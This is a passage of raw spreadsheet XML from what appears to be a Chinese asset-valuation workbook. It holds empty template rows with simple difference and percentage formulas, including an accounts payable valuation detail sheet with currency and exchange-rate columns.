      <c r="I7" s="555">
        <f>H7-G7</f>
        <v/>
      </c>
      <c r="J7" s="555">
        <f>IF(G7=0,"",I7/G7*100)</f>
        <v/>
      </c>
      <c r="K7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555">
        <f>H8-G8</f>
        <v/>
      </c>
      <c r="J8" s="555">
        <f>IF(G8=0,"",I8/G8*100)</f>
        <v/>
      </c>
      <c r="K8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555">
        <f>H9-G9</f>
        <v/>
      </c>
      <c r="J9" s="555">
        <f>IF(G9=0,"",I9/G9*100)</f>
        <v/>
      </c>
      <c r="K9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555">
        <f>H10-G10</f>
        <v/>
      </c>
      <c r="J10" s="555">
        <f>IF(G10=0,"",I10/G10*100)</f>
        <v/>
      </c>
      <c r="K10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555">
        <f>H11-G11</f>
        <v/>
      </c>
      <c r="J11" s="555">
        <f>IF(G11=0,"",I11/G11*100)</f>
        <v/>
      </c>
      <c r="K11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555">
        <f>H12-G12</f>
        <v/>
      </c>
      <c r="J12" s="555">
        <f>IF(G12=0,"",I12/G12*100)</f>
        <v/>
      </c>
      <c r="K12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555">
        <f>H13-G13</f>
        <v/>
      </c>
      <c r="J13" s="555">
        <f>IF(G13=0,"",I13/G13*100)</f>
        <v/>
      </c>
      <c r="K13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555">
        <f>H14-G14</f>
        <v/>
      </c>
      <c r="J14" s="555">
        <f>IF(G14=0,"",I14/G14*100)</f>
        <v/>
      </c>
      <c r="K14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555">
        <f>H15-G15</f>
        <v/>
      </c>
      <c r="J15" s="555">
        <f>IF(G15=0,"",I15/G15*100)</f>
        <v/>
      </c>
      <c r="K15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555">
        <f>H16-G16</f>
        <v/>
      </c>
      <c r="J16" s="555">
        <f>IF(G16=0,"",I16/G16*100)</f>
        <v/>
      </c>
      <c r="K16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555">
        <f>H17-G17</f>
        <v/>
      </c>
      <c r="J17" s="555">
        <f>IF(G17=0,"",I17/G17*100)</f>
        <v/>
      </c>
      <c r="K17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555">
        <f>H18-G18</f>
        <v/>
      </c>
      <c r="J18" s="555">
        <f>IF(G18=0,"",I18/G18*100)</f>
        <v/>
      </c>
      <c r="K18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="578" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555">
        <f>H19-G19</f>
        <v/>
      </c>
      <c r="J19" s="555">
        <f>IF(G19=0,"",I19/G19*100)</f>
        <v/>
      </c>
      <c r="K19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="578" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555">
        <f>H20-G20</f>
        <v/>
      </c>
      <c r="J20" s="555">
        <f>IF(G20=0,"",I20/G20*100)</f>
        <v/>
      </c>
      <c r="K20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="578" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555">
        <f>H21-G21</f>
        <v/>
      </c>
      <c r="J21" s="555">
        <f>IF(G21=0,"",I21/G21*100)</f>
        <v/>
      </c>
      <c r="K21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="578" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555">
        <f>H22-G22</f>
        <v/>
      </c>
      <c r="J22" s="555">
        <f>IF(G22=0,"",I22/G22*100)</f>
        <v/>
      </c>
      <c r="K22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="578" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555">
        <f>H23-G23</f>
        <v/>
      </c>
      <c r="J23" s="555">
        <f>IF(G23=0,"",I23/G23*100)</f>
        <v/>
      </c>
      <c r="K23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="578" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555">
        <f>H24-G24</f>
        <v/>
      </c>
      <c r="J24" s="555">
        <f>IF(G24=0,"",I24/G24*100)</f>
        <v/>
      </c>
      <c r="K24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555">
        <f>H25-G25</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>IF(G25=0,"",I25/G25*100)</f>
        <v/>
      </c>
      <c r="K25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="578" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555">
        <f>H26-G26</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>IF(G26=0,"",I26/G26*100)</f>
        <v/>
      </c>
      <c r="K26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="578" t="n"/>
      <c r="E27" s="578" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555">
        <f>H27-G27</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>IF(G27=0,"",I27/G27*100)</f>
        <v/>
      </c>
      <c r="K27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="578" t="n"/>
      <c r="E28" s="578" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555">
        <f>H28-G28</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>IF(G28=0,"",I28/G28*100)</f>
        <v/>
      </c>
      <c r="K28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A29" s="116" t="n"/>
      <c r="B29" s="380" t="n"/>
      <c r="C29" s="381" t="n"/>
      <c r="D29" s="578" t="n"/>
      <c r="E29" s="578" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="555" t="n"/>
      <c r="H29" s="555" t="n"/>
      <c r="I29" s="555">
        <f>H29-G29</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>IF(G29=0,"",I29/G29*100)</f>
        <v/>
      </c>
      <c r="K29" s="383" t="n"/>
    </row>
    <row r="30" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A30" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B30" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C30" s="567" t="n"/>
      <c r="D30" s="115" t="n"/>
      <c r="E30" s="115" t="n"/>
      <c r="F30" s="380" t="n"/>
      <c r="G30" s="555">
        <f>ROUND(SUM(G6:G29),2)</f>
        <v/>
      </c>
      <c r="H30" s="555">
        <f>ROUND(SUM(H6:H29),2)</f>
        <v/>
      </c>
      <c r="I30" s="555">
        <f>H30-G30</f>
        <v/>
      </c>
      <c r="J30" s="555">
        <f>IF(G30=0,"",I30/G30*100)</f>
        <v/>
      </c>
      <c r="K30" s="383" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B30:C30"/>
    <mergeCell ref="B1:K1"/>
    <mergeCell ref="B4:D4"/>
    <mergeCell ref="B2:K2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:K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4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 codeName="Sheet84">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M30"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A27" sqref="A6:A27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="6" customWidth="1" style="410" min="2" max="2"/>
    <col width="30.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="13.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="18.5" customWidth="1" style="410" min="5" max="5"/>
    <col hidden="1" outlineLevel="1" width="10.3333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col hidden="1" outlineLevel="1" width="11.8333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col hidden="1" outlineLevel="1" width="9.83333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col collapsed="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="9" customWidth="1" style="410" min="12" max="12"/>
    <col width="15.5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应付账款评估明细表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7" t="n"/>
      <c r="L3" s="547" t="n"/>
      <c r="M3" s="402" t="inlineStr">
        <is>
          <t>表5-5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63" t="n"/>
      <c r="G4" s="563" t="n"/>
      <c r="H4" s="563" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M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业务内容</t>
        </is>
      </c>
      <c r="F5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="I5" s="307" t="inlineStr">
        <is>
          <t>账面价值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87" t="n"/>
      <c r="E6" s="380" t="n"/>
      <c r="F6" s="380" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="588" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-I6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(I6=0,"",K6/I6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="588" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-I7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(I7=0,"",K7/I7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="588" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-I8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(I8=0,"",K8/I8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="588" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-I9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(I9=0,"",K9/I9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="588" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-I10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(I10=0,"",K10/I10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="588" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-I11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(I11=0,"",K11/I11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="588" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-I12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(I12=0,"",K12/I12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="588" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-I13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(I13=0,"",K13/I13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="588" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-I14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(I14=0,"",K14/I14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="588" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-I15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(I15=0,"",K15/I15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="588" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-I16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(I16=0,"",K16/I16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="588" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-I17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(I17=0,"",K17/I17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="588" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-I18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(I18=0,"",K18/I18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="588" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-I19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(I19=0,"",K19/I19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="588" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-I20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(I20=0,"",K20/I20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="588" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-I21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(I21=0,"",K21/I21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="588" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-I22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(I22=0,"",K22/I22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="588" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-I23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(I23=0,"",K23/I23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="588" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-I24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(I24=0,"",K24/I24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="588" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-I25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(I25=0,"",K25/I25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="380" t="n"/>
